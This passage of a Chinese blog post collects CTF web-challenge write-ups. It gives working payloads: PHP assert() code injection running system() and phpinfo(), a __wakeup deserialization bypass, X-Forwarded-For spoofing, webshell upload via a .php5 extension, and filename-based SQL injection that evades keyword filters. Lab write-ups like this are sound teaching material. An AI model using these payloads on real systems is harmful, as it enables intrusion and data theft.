class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>涉及函数:</strong></p>
+<ul>
+<li>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</li>
+</ul>
+<p>语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。</p>
+<ul>
+<li>file_exists() 函数检查文件或目录是否存在</li>
+</ul>
+<p>如果指定的文件或目录存在则返回 true，否则返回 false。<br /><br><br />根据上述特性可以对assert第一次出现的位置进行构造：<br /><strong>通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line">qwe<span class="string">&#x27;,&#x27;</span>abc<span class="string">&#x27;)===false and system(&#x27;</span>cat templates/flag.php<span class="string">&#x27;) and strops(&#x27;</span>qwe</span><br><span class="line">结果：</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;qwe&#x27;,&#x27;abc&#x27;)===false and system(&#x27;cat templates/flag.php&#x27;) and strops(&#x27;qwe&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们也可以对第二处进行构造:<br /><strong>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) or phpinfo();#</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关于此处的#:   #是单行注释，由assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)<br>即为注释掉 ‘)<br>利用：<br />1’) or print_r(file_get_contents(‘templates&#x2F;flag.php’));#</p>
+</blockquote>
+<p><a name="SSJyY"></a></p>
+<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>[<a target="_blank" rel="noopener" href="http://tool.chinaz.com/robots/">百度一下robots</a>]:</p>
+<blockquote>
+<p>Robots.txt 是存放在站点根目录下的一个纯文本文件。虽然它的设置很简单，但是作用却很强大。它可以指定搜索引擎蜘蛛只抓取指定的内容，或者是禁止搜索引擎蜘蛛抓取网站的部分或全部内容。<br><strong>使用方法:</strong><br>Robots.txt 文件应该放在网站根目录下，并且该文件是可以通过互联网进行访问的。<br>例如：如果您的网站地址是 <a target="_blank" rel="noopener" href="http://www.yourdomain.com/%E9%82%A3%E4%B9%88%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%BF%85%E9%A1%BB%E8%83%BD%E5%A4%9F%E9%80%9A%E8%BF%87">http://www.yourdomain.com/那么，该文件必须能够通过</a> <a target="_blank" rel="noopener" href="http://www.yourdomain.com/robots.txt">http://www.yourdomain.com/robots.txt</a> 打开并看到里面的内容。<br><strong>格式：</strong><br>User-agent:<br>用于描述搜索引擎蜘蛛的名字，在” Robots.txt “文件中，如果有多条User-agent记录说明有多个搜索引擎蜘蛛会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为<em>，则该协议对任何搜索引擎蜘蛛均有效，在” Robots.txt “文件中，”User-agent:</em>“这样的记录只能有一条。<br>Disallow:<br>用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被Robot访问到。</p>
+</blockquote>
+<p>所以直接访问，再继续访问flag页面即可</p>
+<p><a name="GnJCL"></a></p>
+<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">_=<span class="string">&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123; [0]);.splice(0,1)&#125;&#125;&#125; \&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot; write(s[o%4]buttonif(e.ment&#x27;</span>;<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27; &#x27;</span>)<span class="title function_">with</span>(_.<span class="title function_">split</span>($[Y]))_=<span class="title function_">join</span>(<span class="title function_">pop</span>());<span class="built_in">eval</span>(_)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>加上HTML后缀点开发现乱码，解决办法：将eval改为alert，输出源码“</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line"> if(e.match(/^be0f23/)!=null)</span><br><span class="line">  if(e.match(/233ac/)!=null)</span><br><span class="line">   if(e.match(/e98aa$/)!=null)</span><br><span class="line">    if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">     var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">     var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">     var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">     var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">     var s=[t,n,r,i];</span><br><span class="line">     for(var o=0;o&lt;13;++o)</span><br><span class="line">      &#123;</span><br><span class="line">       document.write(s[o%4][0]);</span><br><span class="line">       s[o%4].splice(0,1)</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">    delete _</span><br></pre></td></tr></table></figure>
+
+<p>解法1：构造payload输进文本框,payload需要满足1.16位 2.be0f23开头 e98aa结尾的 be0f233acc7be98aa<br />解法2：将含有输出flag的代码放到控制台即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">    var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">    var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">    var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">    var s=[t,n,r,i];</span><br><span class="line">    for(var o=0;o&lt;13;++o)</span><br><span class="line">     &#123;</span><br><span class="line">      document.write(s[o%4][0]);</span><br><span class="line">      s[o%4].splice(0,1)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+<p><a name="aKu4b"></a></p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>根据标题，我们能看出来这是一道PHP反序列化题，仔细斟酌，我们需要将它进行序列化，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。</p>
+<blockquote>
+<p><br />serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。<br>可以在__sleep()方法里可以决定哪些属性被序列化<br>如果没有__sleep()方法则默认序列化所有属性</p>
+</blockquote>
+<p>eg:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化函数serialize()</span><br><span class="line">序列化举例说明：</span><br><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure>
+
+<p>本题序列化出来：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br />则如果要绕过__wakeup，则只需改变对象属性的个数即可绕过，则把O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;} 中的1改为大于它的数即可</p>
+<p><a name="rUdpT"></a></p>
+<h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p><a name="a1V1V"></a></p>
+<h3 id="大坑1：二次注入"><a href="#大坑1：二次注入" class="headerlink" title="大坑1：二次注入"></a>大坑1：二次注入</h3><p>进去之后尝试二次注入。即注册用户admin ‘# 完事儿后进去修改密码，修改完的就是admin的密码，结果发现用admin登录之后没用<br><a name="gTR8B"></a></p>
+<h3 id="大坑2：爆破"><a href="#大坑2：爆破" class="headerlink" title="大坑2：爆破"></a>大坑2：爆破</h3><p>尝试爆破的小伙伴就不用费心了<br><a name="wkO77"></a></p>
+<h3 id="大坑3：忘记密码"><a href="#大坑3：忘记密码" class="headerlink" title="大坑3：忘记密码"></a>大坑3：忘记密码</h3><p>在各种办法都试过之后，我终于看到忘记密码这个选项了，别的办法的都试过了，没用，那就只能从这下手了，尝试修改密码，用admin的账户修改，发现报错，没用，差点死心了，不得已而为之，我只好尝试修改自己注册的二次注入用户admin ‘#，用它修改密码然后抓包，修改它，即用户名为admin，发现修改成功！<br><a name="tsClf"></a></p>
+<h3 id="大坑4：IP伪造"><a href="#大坑4：IP伪造" class="headerlink" title="大坑4：IP伪造"></a>大坑4：IP伪造</h3><p>进去之后，不多BB直接点manage，发现IP不被允许，只好再次抓包，在Referer头下面添加X-forwarded-for:127.0.0.1，伪造成功！<br><a name="PQ4X8"></a></p>
+<h3 id="大坑5：do-？"><a href="#大坑5：do-？" class="headerlink" title="大坑5：do??？"></a>大坑5：do??？</h3><p>进去之后啥也没，只好查看页面元素发现提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?module=filemanage&amp;<span class="keyword">do</span>=???</span><br></pre></td></tr></table></figure>
+
+<p>do???这时候就得猜了，无非就是文件上传,upload,尝试之后，终于进去了：<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576407995541-4530fc54-635b-4e00-8797-383a0eb31c73.png" alt="2.png"><br><a name="l3Ijo"></a></p>
+<h3 id="大坑6：一句话写法"><a href="#大坑6：一句话写法" class="headerlink" title="大坑6：一句话写法"></a>大坑6：一句话写法</h3><p>发现写入一句话<?php eval(中间我就省略不写了)?>，显示上传失败：it’s a php,尝试写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(.....懒得打)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a name="OrGSf"></a></p>
+<h3 id="大坑7：后缀名"><a href="#大坑7：后缀名" class="headerlink" title="大坑7：后缀名"></a>大坑7：后缀名</h3><p>发现不让上传PHP文件，更改后缀为js或html，虽然成功了但是没爆出flag，也归为失败<br />几番尝试之后，发现后缀改为php5即可</p>
+<p><a name="aAx8r"></a></p>
+<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>这道题虽说是一道文件上传题，确实是，但是套路用的却是sql注入的，我怎么想也想不到，fuzz几遍后迫于无奈看了一下wp,才发现这是sql注入并且注入点在filename,ohmygod,我太难了。。。</p>
+<p><a name="Vg0Qp"></a></p>
+<h3 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h3><p>用了一下以往的注入思路，union select 1,1,1#<br />发现不仅没点卵用，而且还过滤了union和select<br><a name="yx4fl"></a></p>
+<h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>web_up)</span><br></pre></td></tr></table></figure>
+
+<p>尝试以后发现用这个数据库暴不出来表<br />然后修改一下substr的起始位置参数，看看后边还有没有<br />修改为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,20),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>load)</span><br></pre></td></tr></table></figure>
+
+<p>数据库名合起来为:web_upload</p>
+<p><a name="pcMN4"></a></p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">hello_</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">flag_i</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">s_here</span><br></pre></td></tr></table></figure>
+
+<p>表名连起来就是：hello_flag_is_here<br><a name="e0rnw"></a></p>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">i_am_f</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">lag</span><br></pre></td></tr></table></figure>
+
+<p>列名就出来了：i_am_flag，其实后面不用爆就能猜到是lag<br><a name="xONsw"></a></p>
+<h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span><span class="operator">!</span>_<span class="variable">@m_</span></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">Th.e_F</span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span>lag</span><br></pre></td></tr></table></figure>
+
+<p>flag的值我们就有了:!!&lt;<a href="mailto:&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;">&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;</a>&gt;!lag</p>
+<p><a name="TqsUH"></a></p>
+<h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><p>首先很多人一定有疑问，这个注入语句两端的+加号和单引号是干嘛的?<br />加上＋的意思是把页面传进来的值放在SQL语句里拼接起来<br /><strong>记住这样的传值格式<br /></strong>“numbers”: [true,true,true,true,true,true,true]} &#x2F;&#x2F;定义数组<br />“numbers”:”1,2,3,4,5,6,7”}<br />‘+(xxxxxx)+’</p>
+<p><strong>函数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>CONV()</span><br><span class="line">        简单的来说这个函数就是用来进行进制的转换的</span><br><span class="line">        </span><br><span class="line">        CONV(N,from_base,to_base)</span><br><span class="line">        </span><br><span class="line">        N是要转换的数据，from_base是原进制，to_base是目标进制。</span><br><span class="line">        </span><br><span class="line">        如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</span><br><span class="line">        </span><br><span class="line"> <span class="number">2.</span>substr（）</span><br><span class="line">    简单来说 这个函数是用来搜索字符串的</span><br><span class="line">        </span><br><span class="line">    substr(string string,num <span class="keyword">start</span>,num length);</span><br><span class="line"></span><br><span class="line">    string为字符串；</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">start</span>为起始位置；</span><br><span class="line">    </span><br><span class="line">    length为长度。</span><br><span class="line">    </span><br><span class="line">    mysql中的<span class="keyword">start</span>是从<span class="number">1</span>开始的，而hibernate中的<span class="keyword">start</span>是从<span class="number">0</span>开始的。</span><br><span class="line">        </span><br><span class="line">        注意，这里substr取<span class="number">12</span>位是因为一旦过长（超出<span class="number">12</span>），就会用科学记数法显示</span><br><span class="line"></span><br><span class="line"> <span class="number">3.</span>hex（）</span><br><span class="line">    这个就很好理解了，转为<span class="number">16</span>进制嘛</span><br><span class="line">        </span><br><span class="line">  <span class="number">4.</span>limit</span><br><span class="line">     LIMIT 子句可以被用于强制 <span class="keyword">SELECT</span> 语句返回指定的记录数。</span><br><span class="line"></span><br><span class="line">    LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。</span><br><span class="line"></span><br><span class="line">    如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</span><br><span class="line"></span><br><span class="line">    初始记录行的偏移量是 <span class="number">0</span>(而不是 <span class="number">1</span>)：</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">5</span>,<span class="number">10</span>; <span class="operator">/</span><span class="operator">/</span> 代表从第<span class="number">5</span>行开始(<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行)检索<span class="number">10</span>行，即检索<span class="number">6</span><span class="number">-15</span>行,从第<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">95</span>,<span class="number">-1</span>; <span class="operator">/</span><span class="operator">/</span> 检索记录行 <span class="number">96</span><span class="operator">-</span>last.从<span class="number">95</span><span class="operator">+</span><span class="number">1</span>开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">5</span>;     <span class="operator">/</span><span class="operator">/</span>检索前 <span class="number">5</span> 个记录行</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/01/10/Memory-Forensics/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-21 01:39:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CTF/" title="CTF">
+                        #CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2020/03/20/Introduction-to-Mini-Program-Development-2/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
